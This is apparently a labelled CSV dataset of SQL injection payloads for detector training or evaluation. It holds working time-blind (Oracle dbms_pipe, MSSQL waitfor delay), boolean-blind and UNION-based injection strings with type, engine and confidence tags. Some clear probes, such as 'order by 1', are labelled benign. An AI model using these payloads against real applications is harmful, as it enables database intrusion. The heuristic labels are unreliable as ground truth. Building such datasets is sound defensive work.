id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23059,"1' in boolean mode ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) #",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23125,"1"" ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23007,"iif ( 1746 = 1730,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
23015,1 waitfor delay '0:0:5',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23021,1' ) ) waitfor delay '0:0:5' and ( ( 'bbqk' = 'bbqk,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23045,1' waitfor delay '0:0:5',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23052,1' waitfor delay '0:0:5' and 'vwuz' = 'vwuz,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23082,waitfor delay '0:0:5' and 'gsvt' = 'gsvt,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23102,1' where 6035 = 6035 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23113,"1' where 3425 = 3425 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
23137,1%' ) ) waitfor delay '0:0:5' and ( ( '%' = ',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23156,"1%"" waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23168,waitfor delay '0:0:5' ) +',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23170,-4882' order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
23193,-7901 ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
23003,"1%"" ) ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
23011,-3938%' ) ) ) or 2034 = 7209#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
23016,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
23019,"1"" ) where 1700 = 1700 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
23024,"-8159 where 2793 = 2793 union all select 2793,2793,2793,2793,2793#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
23030,"1%' ) union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
23032,"-7008' ) ) union all select 9080,9080,9080#",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
23034,1' ) as lgex where 4068 = 4068 and 1378 = 9247--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
23040,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
